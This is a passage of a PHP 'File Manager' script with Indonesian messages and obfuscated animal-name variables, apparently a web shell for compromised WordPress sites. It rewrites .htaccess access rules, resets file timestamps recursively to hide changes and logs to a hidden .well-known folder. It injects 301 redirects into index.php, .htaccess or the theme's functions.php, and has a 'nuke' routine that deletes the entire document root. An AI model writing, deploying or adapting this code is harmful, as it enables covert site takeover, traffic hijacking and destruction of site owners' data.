                        foreach ($kecoak3 as $anjing4 => $capung3) {
                            if (stripos($capung3, $macan1) !== false) {
                                $domba4[] = [
                                    'line'    => $anjing4 + 1,
                                    'snippet' => trim($capung3),
                                ];
                                if (count($domba4) >= 5) break; 
                            }
                        }

                        if ($domba4) {
                            $kerbau6[] = [
                                'type'  => 'content',
                                'kind'  => 'file',
                                'path'  => $kucing6,
                                'full'  => $lebah2,
                                'lines' => $domba4,
                            ];
                            $kambing7['contentMatches']++;
                        }
                    }
                }
            }
        }

        
        if (count($kerbau6) >= $monyet4) {
            $kambing7['stoppedByLimit'] = true;
            $sapi2[] = "Hasil lebih dari {$monyet4} entri. Ditampilkan sebagian saja.\n" .
                        "Kalau mau lebih spesifik, coba sempitkan root folder atau keywordnya.";
            break;
        }
    }

    return true;
}


if (isset($_POST['runSearch'])) {
    $kodok6 = isset($_POST['search_root']) ? trim($_POST['search_root']) : '';
    $ikan4      = isset($_POST['search_name']) ? trim($_POST['search_name']) : '';
    $beruang1   = isset($_POST['search_content']) ? trim($_POST['search_content']) : '';

    
    if ($kodok6 === '') {
        if (!empty($_GET['folder'])) {
            $kodok6 = sanitizePath($_GET['folder']);
        } else {
            $kodok6 = $monyet6;
        }
    } else {
        $kodok6 = sanitizePath($kodok6);
    }

    $kerbau6 = [];
    $kambing7   = [];
    $sapi2  = [];

    $cacing4 = fm_search_scan($kodok6, $ikan4, $beruang1, $kerbau6, $kambing7, $sapi2);

    if ($sapi2) {
        
        $_SESSION['search_status'] = ($cacing4 && ($kambing7['nameMatches'] || $kambing7['contentMatches'])) ? 'partial' : 'error';
        $_SESSION['search_message'] = implode(" \n", $sapi2);
    } else {
        $_SESSION['search_status'] = 'success';
        $_SESSION['search_message'] =
            "Search selesai.\n" .
            "Root: {$kodok6}\n" .
            "Match nama: " . (int)((isset($kambing7['nameMatches']) ? $kambing7['nameMatches'] : 0)) . ", match isi file: " . (int)((isset($kambing7['contentMatches']) ? $kambing7['contentMatches'] : 0)) . ".\n" .
            "Folder discan: " . (int)((isset($kambing7['dirs']) ? $kambing7['dirs'] : 0)) . ", file discan: " . (int)((isset($kambing7['files']) ? $kambing7['files'] : 0)) . ".";
    }

    $_SESSION['search_results'] = $kerbau6;
    $_SESSION['search_stats']   = $kambing7;
    $_SESSION['search_root']    = $kodok6;
    $_SESSION['search_name']    = $ikan4;
    $_SESSION['search_content'] = $beruang1;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}


function write_htaccess_with_backup($orangutan7, $panda1, &$sapi2) {
    $orangutan7 = rtrim($orangutan7, DIRECTORY_SEPARATOR);
    if (!is_dir($orangutan7)) { $sapi2[] = "Folder tidak ditemukan: {$orangutan7}"; return false; }
    if (!is_writable($orangutan7)) { @chmod($orangutan7, 0777); }
    if (!is_writable($orangutan7)) { $sapi2[] = "Folder tidak writable: {$orangutan7}"; return false; }

    $panda3 = $orangutan7 . DIRECTORY_SEPARATOR . '.htaccess';
    if (file_exists($panda3) && is_writable($panda3)) {
        @rename($panda3, $panda3 . '.bak_' . date('Ymd_His'));
    }
    $cacing4 = @file_put_contents($panda3, $panda1);
    if ($cacing4 === false) { $sapi2[] = "Gagal menulis .htaccess di {$orangutan7}"; return false; }
    return true;
}

function resolve_inside_docroot_dir($kadal5, &$sapi2) {
    $kadal5 = trim(sanitizePath($kadal5));
    if ($kadal5 === '') { $sapi2[] = "Path custom kosong."; return null; }

    
    if ($kadal5[0] !== DIRECTORY_SEPARATOR) {
        $rusa = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($kadal5, DIRECTORY_SEPARATOR);
    } else {
        $rusa = $kadal5;
    }

    
    $belut5 = @realpath($rusa);
    if ($belut5 === false) { $belut5 = $rusa; } 
    if (!is_dir($belut5)) { $sapi2[] = "Path custom bukan folder yang valid: {$kadal5}"; return null; }

    $belut1 = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$belut1 || strpos($belut5, $belut1) !== 0) { $sapi2[] = "Path custom harus di dalam Document Root."; return null; }

    return $belut5;
}

if (isset($_POST['doHtaccessReplace'])) {
    
    $kecoak7 = <<<'HTA'
Options -Indexes

<FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
  <IfModule mod_authz_core.c>
    Require all denied
  </IfModule>

  <IfModule !mod_authz_core.c>
    Order allow,deny
    Deny from all
  </IfModule>
</FilesMatch>
HTA;

    $kupu7 = <<<'HTA'
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{REQUEST_URI} \.(?:css|js|map|png|jpe?g|gif|svg|webp|ico|bmp|tiff|mp4|webm|m4v|mp3|m4a|ogg|oga|ogv|wav|pdf|docx?|xlsx?|pptx?|csv|txt|vtt|woff2?|otf|eot|html)$ [NC]
  RewriteRule ^ - [L]
  RewriteRule ^ - [F]
</IfModule>
HTA;

    $lebah7 = <<<'HTA'
<FilesMatch ".*">
    Order Allow,Deny
    Allow from all
</FilesMatch>

<IfModule mod_authz_core.c>
    <FilesMatch ".*">
        Require all granted
    </FilesMatch>
</IfModule>

Options -Indexes
HTA;

    $semut7 = <<<'HTA'
<IfModule mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Require all denied
  </FilesMatch>
</IfModule>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Order allow,deny
    Deny from all
  </FilesMatch>
</IfModule>

HTA;

    $anjing5 = [];
    $sapi2 = [];

    
    if (!empty($_POST['replaceIncludes'])) {
        $lumba1 = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-includes';
        if (write_htaccess_with_backup($lumba1, $kecoak7, $sapi2)) {
            $anjing5[] = '/wp-includes';
        }
    }
    
    if (!empty($_POST['replaceContent'])) {
        $lumba1 = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-content';
        if (write_htaccess_with_backup($lumba1, $kupu7, $sapi2)) {
            $anjing5[] = '/wp-content';
        }
    }
    
    if (!empty($_POST['replaceCustom'])) {
        $burung4 = (isset($_POST['customMode']) && $_POST['customMode'] === 'deny') ? 'deny' : 'allow';
        $musang1 = resolve_inside_docroot_dir((isset($_POST['customPath']) ? $_POST['customPath'] : ''), $sapi2);
        if ($musang1) {
            $capung7 = ($burung4 === 'deny') ? $semut7 : $lebah7;
            if (write_htaccess_with_backup($musang1, $capung7, $sapi2)) {
                $anjing5[] = str_replace($_SERVER['DOCUMENT_ROOT'], '', $musang1) ?: '/';
            }
        }
    }

    if ($anjing5) {
        $_SESSION['htreplace_status']  = 'success';
        $_SESSION['htreplace_message'] = 'Berhasil replace .htaccess pada: ' . htmlspecialchars(implode(', ', $anjing5));
    } else {
        $_SESSION['htreplace_status']  = 'error';
        $_SESSION['htreplace_message'] = 'Tidak ada .htaccess yang diganti.' . ($sapi2 ? ' (' . implode(' | ', array_map('htmlspecialchars', $sapi2)) . ')' : '');
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}


function _resolve_inside_docroot_any($kadal5, &$sapi2) {
    $kadal5 = trim(sanitizePath($kadal5));
    if ($kadal5 === '') { $sapi2[] = "Path kosong."; return null; }

    
    $gorila3 = ($kadal5[0] === DIRECTORY_SEPARATOR) || preg_match('/^[A-Za-z]:[\\\\\\/]/', $kadal5);
    $rusa = $gorila3
        ? $kadal5
        : rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($kadal5, DIRECTORY_SEPARATOR);

    
    $belut5 = @realpath($rusa);
    if ($belut5 === false) $belut5 = $rusa;

    
    if ($belut5 === DIRECTORY_SEPARATOR) { $sapi2[] = "Menolak path root sistem ('/')."; return null; }

    if (!file_exists($belut5)) { $sapi2[] = "Path tidak ditemukan: {$kadal5}"; return null; }

    return $belut5;
}

if (isset($_POST['doSyncTimestamp'])) {
    $sapi2 = [];
    $merpati7 = isset($_POST['ts_target']) ? $_POST['ts_target'] : '';
    $gagak1   = isset($_POST['ts_newdate']) ? $_POST['ts_newdate'] : '';
    $kupu5 = !empty($_POST['ts_recursive']);

    
    @set_time_limit(180);           
    @ini_set('memory_limit', '-1'); 
    @ignore_user_abort(true);

    
    $panda4  = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . '/.well-known/acme-challenge/logs';
    if (!is_dir($panda4)) { @mkdir($panda4, 0777, true); }
    $koala4 = $panda4 . '/timestamp_sync.log';
    @ini_set('log_errors', '1');
    @ini_set('error_log', $koala4);

    $simpanse7 = _resolve_inside_docroot_any($merpati7, $sapi2);

    if (!$sapi2) {
        $gagak1 = trim($gagak1);
        if ($gagak1 === '') {
            $sapi2[] = "Tanggal/waktu baru tidak boleh kosong.";
        } else {
            
            
            $bebek4 = false;
            try {
                $tzUser   = new \DateTimeZone('Asia/Jakarta');
                $dt       = new \DateTime($gagak1, $tzUser);
                $bebek4   = $dt->getTimestamp(); 
            } catch (\Exception $e) {
                $bebek4 = false;
            }

            if ($bebek4 === false) {
                $sapi2[] = "Format tanggal/waktu tidak valid.";
            } else {
                $burung = $bebek4; 
            }
        }
    }

    $paus2 = 0;
    $kadal1  = 0;

    
    $panda2      = [];
    $bison4  = 200;

    
    $paus5    = 0;
    $tupai4 = 50000; 

    if (!$sapi2) {
        $biawak1 = function($kambing5) use ($bebek4, $burung, &$paus2, &$kadal1, &$panda2, $bison4) {
            
            if (!@is_writable($kambing5)) {
                if (count($panda2) < $bison4) $panda2[] = "Not writable: {$kambing5}";
                @error_log("timestamp-sync: not writable -> {$kambing5}");
                return;
            }
            if (@touch($kambing5, $bebek4, $burung)) {
                if (is_dir($kambing5)) $kadal1++; else $paus2++;
            } else {
                if (count($panda2) < $bison4) $panda2[] = "Gagal touch: {$kambing5}";
                @error_log("timestamp-sync: touch failed -> {$kambing5}");
            }
        };

        if (is_dir($simpanse7) && $kupu5) {
            
            $harimau7 = ['node_modules','vendor','.git','cache','tmp','logs','wp-content/uploads'];

            $elang3 = new \RecursiveIteratorIterator(
                new \RecursiveCallbackFilterIterator(
                    new \RecursiveDirectoryIterator($simpanse7, \FilesystemIterator::SKIP_DOTS),
                    function (\SplFileInfo $musang3) use ($harimau7) {
                        $angsa4 = $musang3->getFilename();
                        if ($musang3->isDir()) {
                            foreach ($harimau7 as $elang6) {
                                if (strcasecmp($angsa4, $elang6) === 0) return false;
                            }
                        }
                        
                        return !$musang3->isLink();
                    }
                ),
                \RecursiveIteratorIterator::SELF_FIRST
            );

            $ular1 = [];
            foreach ($elang3 as $gorila5 => $musang3) {
                if (++$paus5 > $tupai4) { 
                    @error_log("timestamp-sync: processed limit {$paus5} reached, stopping early.");
                    break; 
                }
                if ($musang3->isDir()) {
                    $ular1[] = $gorila5; 
                    continue;
                }
                $biawak1($gorila5); 
            }
            
            usort($ular1, function($kuda, $elang) {
            $ular3 = strlen($kuda);
            $katak3 = strlen($elang);
            if ($ular3 == $katak3) return 0;
            
            return ($ular3 < $katak3) ? 1 : -1;
        });
            foreach ($ular1 as $monyet1) {
                if (++$paus5 > $tupai4) break;
                $biawak1($monyet1);
            }
            
            if ($paus5 <= $tupai4) {
                $biawak1($simpanse7);
            }
        } else {
            
            $biawak1($simpanse7);
        }
    }

    if ($sapi2) {
        $_SESSION['ts_status']  = 'error';
        $_SESSION['ts_message'] = 'Gagal: ' . htmlspecialchars(implode(' | ', $sapi2));
    } else {
        $ayam4 = "SUKSES update timestamp.\n".
               "Target: {$simpanse7}\n".
               "Timestamp baru: " . date('c', (int)$bebek4) . "\n".
               "Tersentuh: {$paus2} file, {$kadal1} direktori";
        if ($paus5 > $tupai4) {
            $ayam4 .= "\nCatatan: pemrosesan dibatasi pada {$tupai4} entri untuk mencegah timeout.";
        }
        if (!empty($panda2)) {
            $macan7 = array_slice($panda2, 0, 10);
            $ayam4 .= "\nPERINGATAN (" . count($panda2) . " ditampilkan maks 10): " . implode(' | ', array_map('htmlspecialchars', $macan7));
        }
        $_SESSION['ts_status']  = empty($panda2) ? 'success' : 'partial';
        $_SESSION['ts_message'] = nl2br($ayam4);
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}


function getNiceSize($kupu) {
    $gajah7 = ['B', 'KB', 'MB', 'GB', 'TB'];
    if ($kupu == 0) return '0 B';
    $bison3 = floor(log($kupu, 1024));
    return round($kupu / pow(1024, $bison3), 2).' '.$gajah7[$bison3];
}


function fm_parse_redirect_source($buaya5, &$simpanse3, &$gorila5) {
    $buaya5 = trim((string)$buaya5);

    
    $simpanse3 = false;
    $gorila5   = '/';

    if ($buaya5 === '') {
        $simpanse3 = true;
        $gorila5   = '/';
        return;
    }

    
    $cacing = preg_replace('#^https?://[^/]+#i', '', $buaya5);
    $cacing = trim($cacing);

    
    if ($cacing === '' || $cacing === '/' || strtolower($cacing) === 'homepage') {
        $simpanse3 = true;
        $gorila5   = '/';
        return;
    }

    
    if ($cacing[0] !== '/') $cacing = '/'.$cacing;

    
    $singa5 = parse_url($cacing, PHP_URL_PATH);
    if (!$singa5) $singa5 = $cacing;

    $simpanse3 = ($singa5 === '/' || $singa5 === '/index.php');
    $gorila5   = $singa5;
}


if (isset($_POST['runRedirect301'])) {
    $ayam7  = isset($_POST['redirect_target_type']) ? $_POST['redirect_target_type'] : '';
    $panda7   = isset($_POST['redirect_source']) ? $_POST['redirect_source'] : '';
    $domba8  = isset($_POST['redirect_target_url']) ? trim($_POST['redirect_target_url']) : '';
    $semut5  = $domba8 !== '' ? $domba8 : $lebah5; 
    $sapi2      = [];
    $elang7 = '';

    
    $panda7 = trim((string)$panda7);
    if ($panda7 === '') {
        $sapi2[] = 'URL/path yang akan di-redirect wajib diisi.';
    }

    
    if ($semut5 === '') {
        $sapi2[] = 'URL tujuan redirect wajib diisi.';
    } elseif (!filter_var($semut5, FILTER_VALIDATE_URL)) {
        $sapi2[] = 'URL tujuan redirect tidak valid.';
    }

    
    $simpanse3 = false;
    $gorila5   = '/';
    if (!$sapi2) {
        fm_parse_redirect_source($panda7, $simpanse3, $gorila5);
    }

    if (!$sapi2) {
         if ($ayam7 === 'htaccess') {
            $elang7 = '.htaccess (Document Root)';

            $capung1 = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $panda3      = $capung1 . DIRECTORY_SEPARATOR . '.htaccess';

            $serigala2 = '';
            if (file_exists($panda3)) {
                $serigala2 = @file_get_contents($panda3);
                if ($serigala2 === false) {
                    $sapi2[] = 'Gagal membaca .htaccess.';
                }
            }

            if (!$sapi2) {
                $kelinci3 = stripos($serigala2, 'RewriteEngine On') !== false;

                $beruang7 = '';

                if (!$kelinci3) {
                    $beruang7 .= "RewriteEngine On\n\n";
                }

                if ($simpanse3) {
                    $beruang7 .= "RewriteRule ^$ {$semut5} [R=301,L]\n";
                } else {
                    $burung5 = trim($gorila5, '/');
                    $burung5 = preg_quote($burung5, '#');
                    $beruang7 .= "RewriteRule ^{$burung5}/?$ {$semut5} [R=301,L]\n";
                }

                $ikan5 = stripos($serigala2, '# BEGIN WordPress');

                if ($ikan5 !== false) {
                    $buaya     = substr($serigala2, 0, $ikan5);
                    $musang      = substr($serigala2, $ikan5);
                    $buaya4 = rtrim($buaya, "\r\n")
                                . "\n\n"
                                . $beruang7
                                . "\n"
                                . ltrim($musang, "\r\n");
                } else {
                    $buaya4 = rtrim($serigala2, "\r\n") . "\n\n" . $beruang7;
                }

                if (@file_put_contents($panda3, $buaya4) === false) {
                    $sapi2[] = 'Gagal menulis .htaccess.';
                }
            }

        } elseif ($ayam7 === 'index') {
            $elang7 = 'index.php (Document Root)';

            $capung1 = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $monyet2    = $capung1 . DIRECTORY_SEPARATOR . 'index.php';

            if (!file_exists($monyet2)) {
                $sapi2[] = 'index.php tidak ditemukan di Document Root.';
            } else {
                $koala7 = @file_get_contents($monyet2);
                if ($koala7 === false) {
                    $sapi2[] = 'Gagal membaca index.php.';
                } else {
                    if (strpos($koala7, '// 301 redirect (File Manager)') !== false) {
                        $sapi2[] = 'Redirect 301 dari File Manager sudah pernah ditambahkan ke index.php.';
                    } else {
                        $beruang7  = "\n// 301 redirect (File Manager)\n";
                        $beruang7 .= "if (php_sapi_name() !== 'cli') {\n";
                        $beruang7 .= "    \$kambing6 = isset(\$_SERVER['REQUEST_URI']) ? \$_SERVER['REQUEST_URI'] : '/';\n";
                        $beruang7 .= "    \$gorila5 = parse_url(\$kambing6, PHP_URL_PATH);\n";
                        $beruang7 .= "    if (!\$gorila5) { \$gorila5 = '/'; }\n";

                        if ($simpanse3) {
                            $beruang7 .= "    if (\$gorila5 === '/' || \$gorila5 === '/index.php') {\n";
                        } else {
                            $domba5 = $gorila5;
                            $kuda5 = rtrim($gorila5, '/');
                            if ($kuda5 === '') $kuda5 = '/';
                            $beruang7 .= "    if (\$gorila5 === '".addslashes($domba5)."' || \$gorila5 === '".addslashes($kuda5)."') {\n";
                        }

                        $beruang7 .= "        header('Location: {$semut5}', true, 301);\n";
                        $beruang7 .= "        exit;\n";
                        $beruang7 .= "    }\n";
                        $beruang7 .= "}\n";

                        $itik5 = strpos($koala7, '<?php');
                        if ($itik5 === false) {
                            $lumba4 = "<?php\n{$beruang7}\n?>\n" . $koala7;
                        } else {
                            $hiu5 = $itik5 + 5;
                            $lumba4    = substr($koala7, 0, $hiu5) . "\n{$beruang7}\n" . substr($koala7, $hiu5);
                        }

                        if (@file_put_contents($monyet2, $lumba4) === false) {
                            $sapi2[] = 'Gagal menulis index.php.';
                        }
                    }
                }
            }

        } elseif ($ayam7 === 'theme') {
            $elang7 = 'functions.php Theme Aktif';

            $capung1 = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $elang8  = $capung1 . DIRECTORY_SEPARATOR . 'wp-load.php';

            if (!file_exists($elang8)) {
                $sapi2[] = 'wp-load.php tidak ditemukan. Tidak bisa otomatis mendeteksi theme.';
            } else {
                require_once $elang8;

                if (!function_exists('get_stylesheet_directory')) {
                    $sapi2[] = 'Fungsi get_stylesheet_directory() tidak tersedia.';
                } else {
                    $hiu7  = rtrim(get_stylesheet_directory(), DIRECTORY_SEPARATOR);
                    $semut2  = $hiu7 . DIRECTORY_SEPARATOR . 'functions.php';

                    if (!file_exists($semut2)) {
                        $sapi2[] = 'functions.php theme aktif tidak ditemukan.';
                    } else {
                        $koala7 = @file_get_contents($semut2);
                        if ($koala7 === false) {
                            $sapi2[] = 'Gagal membaca functions.php theme.';
                        } else {
                            if (strpos($koala7, '// 301 redirect (File Manager)') !== false) {
                                $sapi2[] = 'Redirect 301 dari File Manager sudah pernah ditambahkan ke functions.php.';
                            } else {
                                $beruang7  = "\n\n// 301 redirect (File Manager)\n";
                                $beruang7 .= "add_action('template_redirect', function () {\n";
                                $beruang7 .= "    \$kambing6 = isset(\$_SERVER['REQUEST_URI']) ? \$_SERVER['REQUEST_URI'] : '/';\n";
                                $beruang7 .= "    \$gorila5 = parse_url(\$kambing6, PHP_URL_PATH);\n";
                                $beruang7 .= "    if (!\$gorila5) { \$gorila5 = '/'; }\n";

                                if ($simpanse3) {
                                    $beruang7 .= "    if (\$gorila5 === '/' || \$gorila5 === '/index.php') {\n";
                                } else {
                                    $domba5 = $gorila5;
                                    $kuda5 = rtrim($gorila5, '/');
                                    if ($kuda5 === '') $kuda5 = '/';
                                    $beruang7 .= "    if (\$gorila5 === '".addslashes($domba5)."' || \$gorila5 === '".addslashes($kuda5)."') {\n";
                                }

                                $beruang7 .= "        wp_redirect('{$semut5}', 301);\n";
                                $beruang7 .= "        exit;\n";
                                $beruang7 .= "    }\n";
                                $beruang7 .= "});\n";

                                $lumba4 = $koala7 . $beruang7;

                                if (@file_put_contents($semut2, $lumba4) === false) {
                                    $sapi2[] = 'Gagal menulis functions.php theme.';
                                }
                            }
                        }
                    }
                }
            }

        } else {
            $sapi2[] = 'Target file tidak valid. Pilih htaccess / index / theme.';
        }
    }

    if ($sapi2) {
        $_SESSION['redirect_status']  = 'error';
        $_SESSION['redirect_message'] = 'Gagal membuat redirect: ' . implode(' | ', $sapi2);
    } else {
        $_SESSION['redirect_status']  = 'success';
        $_SESSION['redirect_message'] = 'Redirect 301 ditambahkan untuk "' .
            htmlspecialchars($panda7, ENT_QUOTES) .
            '" → ' . htmlspecialchars($semut5, ENT_QUOTES) .
            ' di ' . $elang7 . '.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}


function fm_nuke_zip_and_delete($capung1, $ular5, &$koala5, &$sapi5) {
    @set_time_limit(0);
    @ini_set('memory_limit','-1');

    $sapi5   = 'error';
    $kupu1 = @realpath($capung1);
    if (!$kupu1 || !is_dir($kupu1)) {
        $koala5 = 'Document Root tidak valid.';
        return;
    }

    if (!class_exists('ZipArchive')) {
        $koala5 = 'Ekstensi ZipArchive tidak tersedia di server.';
        return;
    }

    
    $bebek = $kupu1 . DIRECTORY_SEPARATOR . 'wp-content' . DIRECTORY_SEPARATOR . 'recovery';
    if (!is_dir($bebek)) {
        @mkdir($bebek, 0777, true);
    }
    $angsa = @realpath($bebek);
    if (!$angsa) {
        $koala5 = 'Gagal menyiapkan folder backup: ' . $bebek;
        return;
    }

    
    $rusa2              = [];
    $rusa2[]            = rtrim($angsa, DIRECTORY_SEPARATOR); 
    $kucing1   = [];

    if (is_string($ular5) && trim($ular5) !== '') {
        $serigala5 = preg_split('/[\r\n,]+/', $ular5);
        foreach ($serigala5 as $capung3) {
            $capung3 = trim($capung3);
            if ($capung3 === '') continue;
            $kucing1[] = $capung3;

            
            if ($capung3[0] === '/' || $capung3[0] === '\\') {
                $rusa = $kupu1 . DIRECTORY_SEPARATOR . ltrim(str_replace('\\','/',$capung3), '/');
            } else {
                $rusa = $kupu1 . DIRECTORY_SEPARATOR . str_replace('\\','/',$capung3);
            }
            $rusa  = rtrim($rusa, DIRECTORY_SEPARATOR);
            $belut5 = @realpath($rusa);
            if ($belut5 === false) {
                $belut5 = $rusa;
            }
            if (strpos($belut5, $kupu1) === 0) {
                $rusa2[] = $belut5;
            }
        }
    }

    
    $rusa2 = array_values(array_unique($rusa2));

    
    $hiu8 = 'nuke-backup-' . date('Ymd_His') . '-' . mt_rand(100,999) . '.zip';
    $paus8 = $angsa . DIRECTORY_SEPARATOR . $hiu8;

    $angsa8 = new ZipArchive();
    if ($angsa8->open($paus8, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        $koala5 = 'Gagal membuat file backup ZIP di: ' . $paus8;
        return;
    }

    $lumba2 = FilesystemIterator::SKIP_DOTS;
    $elang3    = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($kupu1, $lumba2),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($elang3 as $ayam3) {
        $kambing5 = $ayam3->getPathname();
        
        if ($kambing5 === $paus8) continue;
        $kucing6 = substr($kambing5, strlen($kupu1) + 1);
        if ($ayam3->isDir()) {
            $angsa8->addEmptyDir($kucing6);
        } else {
            $angsa8->addFile($kambing5, $kucing6);
        }
    }
    $angsa8->close();

    
    $kambing7 = ['files' => 0, 'dirs' => 0, 'skipped' => 0, 'failed' => 0];

    $merpati3 = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($kupu1, $lumba2),
        RecursiveIteratorIterator::CHILD_FIRST
    );

    foreach ($merpati3 as $ayam3) {
        $kambing5     = $ayam3->getPathname();
        $capung5 = @realpath($kambing5);
        if ($capung5 === false) $capung5 = $kambing5;

        $harimau7 = false;
        foreach ($rusa2 as $kuda2) {
            if (strpos($capung5, $kuda2) === 0) {
                $harimau7 = true;
                break;
            }
        }
        if ($harimau7) {
            $kambing7['skipped']++;
            continue;
        }

        
        @chmod($kambing5, 0777);
        if ($ayam3->isDir()) {
            if (@rmdir($kambing5)) {
                $kambing7['dirs']++;
            } else {
                $kambing7['failed']++;
            }
        } else {
            if (@unlink($kambing5)) {
                $kambing7['files']++;
            } else {
                $kambing7['failed']++;
            }
        }
    }

    $sapi5 = ($kambing7['failed'] > 0) ? 'partial' : 'success';

    $anjing6 = str_replace($kupu1, '', $angsa);
    if ($anjing6 === '') $anjing6 = '/wp-content/recovery';

    $ayam4  = "NUKE selesai.\n";
    $ayam4 .= "Document Root : {$kupu1}\n";
    $ayam4 .= "Backup ZIP    : {$paus8}\n\n";
    $ayam4 .= "Path yang TIDAK dihapus:\n";
    $ayam4 .= "  - {$anjing6} (folder backup)\n";
    foreach ($kucing1 as $capung3) {
        $ayam4 .= "  - {$capung3}\n";
    }
    $ayam4 .= "\nStatistik penghapusan:\n";
    $ayam4 .= "  File terhapus    : {$kambing7['files']}\n";
    $ayam4 .= "  Folder terhapus  : {$kambing7['dirs']}\n";
    $ayam4 .= "  Path dilewati    : {$kambing7['skipped']}\n";
    $ayam4 .= "  Gagal dihapus    : {$kambing7['failed']}\n";
    $ayam4 .= "\nCATATAN: Restore hanya bisa dilakukan dengan mengekstrak ZIP backup secara manual ke Document Root.\n";
    if ($sapi5 === 'partial') {
        $ayam4 .= "Beberapa path gagal dihapus. Cek permission/ownership secara manual.\n";
    }

    $koala5 = $ayam4;
}

if (isset($_POST['runNuke'])) {
    $ular5 = isset($_POST['nuke_exceptions']) ? $_POST['nuke_exceptions'] : '';
    $ayam4    = '';
    $domba7 = 'error';

    fm_nuke_zip_and_delete($_SERVER['DOCUMENT_ROOT'], $ular5, $ayam4, $domba7);

    $_SESSION['nuke_status']  = $domba7;
    $_SESSION['nuke_message'] = $ayam4;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

function format_htaccess_locked_html($musang6, array $sapi3, array $macan4) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Scan: .htaccess &amp; Folder Locked</h2>
      <div class="section-desc">Root: <code><?= htmlspecialchars($musang6) ?></code></div>

      <?php if (count($sapi3)): ?>
        <h3>.htaccess ditemukan (<?= (int)count($sapi3) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Lokasi</th></tr></thead>
          <tbody>
          <?php foreach ($sapi3 as $bison3 => $kambing5): ?>
            <tr>
              <td><?= $bison3+1 ?></td>
              <td><code><?= htmlspecialchars($kambing5) ?></code></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file <code>.htaccess</code> yang terdeteksi.</div>
      <?php endif; ?>

      <hr class="sep">

      <?php if (count($macan4)): ?>
        <h3>Folder terkunci CHMOD (<?= (int)count($macan4) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Folder</th><th>Permission</th></tr></thead>
          <tbody>
          <?php foreach ($macan4 as $bison3 => $burung6): ?>
            <tr>
              <td><?= $bison3+1 ?></td>
              <td><code><?= htmlspecialchars($burung6['path']) ?></code></td>
              <td><span class="badge badge-warn"><?= htmlspecialchars($burung6['perm']) ?></span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada folder yang terdeteksi dalam kondisi terkunci.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

function format_core_scan_html_report(array $bebek6) {
    
    ob_start(); ?>
    <section class="report-section">
      <h2>Core Scan: <?= htmlspecialchars(strtoupper($bebek6['subdir'])) ?></h2>
      <div class="grid-cards">
        <div class="card stat"><div class="k">WP Version</div><div class="v"><?= htmlspecialchars($bebek6['version']) ?></div></div>
        <div class="card stat"><div class="k">Locale</div><div class="v"><?= htmlspecialchars($bebek6['locale']) ?></div></div>
        <div class="card stat ok"><div class="k">Cocok checksum</div><div class="v"><?= (int)$bebek6['okcount'] ?></div></div>
        <div class="card stat warn"><div class="k">Core berubah</div><div class="v"><?= (int)count($bebek6['modified']) ?></div></div>
        <div class="card stat info"><div class="k">Non-core</div><div class="v"><?= (int)count($bebek6['unknown']) ?></div></div>
      </div>

      <?php if (!empty($bebek6['unreadableDirs'])): ?>
        <h3>Folder tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($bebek6['unreadableDirs'] as $monyet1): ?>
            <li><code><?= htmlspecialchars($monyet1) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <?php if (!empty($bebek6['unreadableFiles'])): ?>
        <h3>File tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($bebek6['unreadableFiles'] as $tupai2): ?>
            <li><code><?= htmlspecialchars($tupai2) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <hr class="sep">

      <h3>Non-core (bukan bagian dari core resmi)</h3>
      <?php if (!empty($bebek6['unknown'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th></tr></thead>
          <tbody>
          <?php foreach ($bebek6['unknown'] as $bison3 => $kelinci8): ?>
            <tr>
              <td><?= $bison3+1 ?></td>
              <td><code><?= htmlspecialchars($kelinci8['path']) ?></code></td>
              <td><?= number_format((int)$kelinci8['size']) ?> B</td>
              <td><?= $kelinci8['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$kelinci8['mtime'])) : '—' ?></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file non-core.</div>
      <?php endif; ?>

      <hr class="sep">

      <h3>Core berubah (checksum mismatch)</h3>
      <?php if (!empty($bebek6['modified'])): ?>
        <table class="tbl">
